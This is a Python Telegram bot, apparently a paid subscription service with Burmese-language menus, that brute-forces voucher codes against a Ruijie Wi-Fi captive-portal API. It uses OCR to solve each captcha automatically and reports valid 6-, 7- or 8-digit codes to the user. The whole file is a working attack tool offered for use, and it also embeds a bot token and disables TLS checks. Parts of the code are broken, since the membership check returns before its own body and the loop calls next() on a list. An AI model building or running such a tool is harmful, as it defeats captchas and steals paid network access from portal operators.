import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8875752513:AAFU6Vrd-FPeXrFXtgI3tGu9mDRX7aDKPv8')
ADMIN_ID = "6621715335"
CHANNEL_ID = "-1002364805811"
CHANNEL_LINK = "https://t.me/+rUbkkAwaEc8zOTI1"
# ============================

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_texts = {}
session = None
_ocr = ddddocr.DdddOcr(show_ad=False)

# ========== DATABASE ==========
DB_FILE = "users_db.json"
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            try: return json.load(f)
            except: return {}
    return {}
def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)
db = load_db()

# ========== HELPERS ==========
def get_user_expiry(user_id):
    user_id = str(user_id)
    if user_id not in db:
        expiry = (datetime.now(timezone.utc) + timedelta(days=1)).isoformat()
        db[user_id] = {"expiry": expiry, "plan": "trial"}
        save_db(db)
    return datetime.fromisoformat(db[user_id].get("expiry"))

def is_subscribed(user_id):
    if str(user_id) == ADMIN_ID: return True
    try:
        expiry = get_user_expiry(user_id)
        return datetime.now(timezone.utc) < expiry
    except: return False

async def check_join(user_id): return True #
    if str(user_id) == ADMIN_ID: return True
    try:
        member = await bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

# ========== UI HELPERS ==========
def main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📥 URL ထည့်ရန်", callback_data="menu_input"),
        InlineKeyboardButton("🔍 Scan ဖတ်ရန်", callback_data="menu_scan"),
        InlineKeyboardButton("📋 ရလဒ်များ", callback_data="menu_result"),
        InlineKeyboardButton("📊 အခြေအနေ", callback_data="menu_status"),
        InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data="menu_stop"),
        InlineKeyboardButton("💳 ဝယ်ယူရန်", callback_data="menu_buy")
    )
    if str(user_id) == ADMIN_ID:
        markup.add(InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel"))
    return markup

# ========== CORE SCANNING LOGIC ==========
async def Captcha_Image(session, session_id):
    url = f"https://portal-as.ruijienetworks.com/api/auth/captcha?sessionId={session_id}&_={int(time.time()*1000)}"
    try:
        async with session.get(url, timeout=5) as resp:
            if resp.status == 200: return await resp.read()
    except: pass
    return None

async def perform_check(session_url, code, chat_id, scan_id):
    global session
    current = scan_tasks.get(chat_id)
    if not current or current.get("scan_id") != scan_id or current.get("stop"): return
    
    session_id_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
    if not session_id_match: return
    session_id = session_id_match.group(1)
    
    captcha_img = await Captcha_Image(session, session_id)
    if not captcha_img: return
    captcha_code = await asyncio.to_thread(lambda: _ocr.classification(captcha_img).upper())
    
    data = {"voucherCode": code, "captcha": captcha_code, "sessionId": session_id}
    try:
        async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher", json=data, timeout=10) as req:
            resp = await req.json()
            # Success check based on Ruijie API response
            if resp.get("code") == 0 and resp.get("data") and "logonUrl" in str(resp):
                if chat_id not in success_texts: success_texts[chat_id] = []
                if code not in success_texts[chat_id]:
                    success_texts[chat_id].append(code)
                    await bot.send_message(chat_id, f"✅ *Voucher ကုဒ် အစစ်အမှန် တွေ့ရှိပါသည်!*\n\n🔑 Code: `{code}`", parse_mode="Markdown")
    except: pass

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
    if mode == "6": codes = [str(i).zfill(6) for i in range(1000000)]
    elif mode == "7": codes = [str(i).zfill(7) for i in range(10000000)]
    else: codes = None
    if codes: random.shuffle(codes)
    checked = 0
    start_time = time.monotonic()
    while True:
        try:
            current = scan_tasks.get(chat_id)
            if not current or current.get("scan_id") != scan_id or current.get("stop"): break
            
            batch = []
            for _ in range(10):
                c = next(codes) if codes else "".join(random.choice(string.digits) for _ in range(8))
                batch.append(c)
                
            await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id) for c in batch])
            checked += 10
            
            if checked % 100 == 0:
                elapsed = time.monotonic() - start_time
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=f"🔍 စစ်ဆေးနေဆဲ... ({mode})\n📦 Checked: `{checked:,}`\n⚡ Speed: `{speed:,.0f} codes/min`", parse_mode="Markdown")
                except: pass
            await asyncio.sleep(0.1) # Prevent CPU hogging
        except Exception as e:
            print(f"Scan error: {e}")
            await asyncio.sleep(1)

# ========== BOT HANDLERS ==========
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = message.from_user.id
    
    expiry = get_user_expiry(user_id)
    await bot.send_message(
        message.chat.id, 
        f"🚀 *StarLink Bot မှ ကြိုဆိုပါတယ်!*\n\n📅 သက်တမ်းကုန်ဆုံးရက်: `{expiry.strftime('%Y-%m-%d %H:%M:%S')}`\n\nအောက်ပါ Menu မှ လိုအပ်သော command ကို ရွေးချယ်ပါ။", 
        reply_markup=main_menu(user_id), 
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['add'])
async def add_user_cmd(message):
    if str(message.from_user.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "❌ သုံးစွဲပုံ: `/add <user_id> <days>`")
        return
    target_id, days = args[1], int(args[2])
    current_expiry = get_user_expiry(target_id)
    new_expiry = (current_expiry if current_expiry > datetime.now(timezone.utc) else datetime.now(timezone.utc)) + timedelta(days=days)
    db[str(target_id)] = {"expiry": new_expiry.isoformat(), "plan": f"{days}days"}
    save_db(db)
    await bot.reply_to(message, f"✅ User `{target_id}` ကို {days} ရက် တိုးပေးလိုက်ပါပြီ။")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "📥 `/input <your_url>` လို့ ရိုက်ထည့်ပေးပါ။\n\nဥပမာ- `/input https://portal-as.ruijienetworks.com/...sessionId=XYZ...`")
        return
    url = args[1].strip()
    # Robust URL check
    if "sessionId=" in url or "sessionId" in url:
        user_data[message.chat.id] = {'session_url': url}
        await bot.reply_to(message, "✅ *Session URL ကို မှတ်သားပြီးပါပြီ။*")
    else:
        await bot.reply_to(message, "❌ *URL မှားယွင်းနေပါသည်။* URL ထဲတွင် `sessionId` ပါဝင်ရပါမည်။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id, user_id = call.message.chat.id, call.from_user.id
    if call.data == "menu_input":
        await bot.send_message(chat_id, "📥 `/input <your_url>` လို့ ရိုက်ထည့်ပေးပါ။")
    elif call.data == "menu_scan":
        if not is_subscribed(user_id):
            await bot.answer_callback_query(call.id, "❌ သက်တမ်းကုန်နေပါသည်။", show_alert=True)
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("6-digit", callback_data="scan_6"),
            InlineKeyboardButton("7-digit", callback_data="scan_7"),
            InlineKeyboardButton("8-digit", callback_data="scan_8"),
            InlineKeyboardButton("All", callback_data="scan_all")
        )
        await bot.send_message(chat_id, "🔍 Scan Mode ရွေးချယ်ပါ:", reply_markup=markup)
    elif call.data.startswith("scan_"):
        mode = call.data.split("_")[1]
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            await bot.answer_callback_query(call.id, "❌ အရင်ဆုံး URL ထည့်ပေးပါ။", show_alert=True)
            return
        progress_msg = await bot.send_message(chat_id, f"🔍 {mode} Mode ဖြင့် စစ်ဆေးနေပါသည်...")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    elif call.data == "menu_stop":
        if chat_id in scan_tasks: scan_tasks[chat_id]["stop"] = True
        await bot.send_message(chat_id, "🛑 ရပ်တန့်လိုက်ပါပြီ။")
    elif call.data == "menu_result":
        codes = success_texts.get(chat_id, [])
        await bot.send_message(chat_id, f"📜 *တွေ့ရှိထားသော ကုဒ်များ:*\n\n" + ("\n".join([f"• `{c}`" for c in codes]) if codes else "မရှိသေးပါ။"), parse_mode="Markdown")
    elif call.data == "menu_status":
        status_text = "📊 *Bot အခြေအနေ*\n\n"
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            status_text += "Scan: `Running 🟢`"
        else:
            status_text += "Scan: `Stopped 🔴`"
        await bot.send_message(chat_id, status_text, parse_mode="Markdown")
    elif call.data == "admin_panel":
        if str(user_id) == ADMIN_ID:
            await bot.send_message(chat_id, "🛠 *Admin Panel*\n\nလူသစ်ထည့်ရန်: `/add <user_id> <days>`", parse_mode="Markdown")
    elif call.data == "menu_buy":
        await bot.send_message(chat_id, f"💳 *ဝယ်ယူရန်*\n\nAdmin @Lord_fo_darkness ကို ဆက်သွယ်ပါ။\nID: `{user_id}`", parse_mode="Markdown")
    await bot.answer_callback_query(call.id)

# ========== WEB SERVER & MAIN ==========
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    global session
    session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=2000, ssl=False))
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
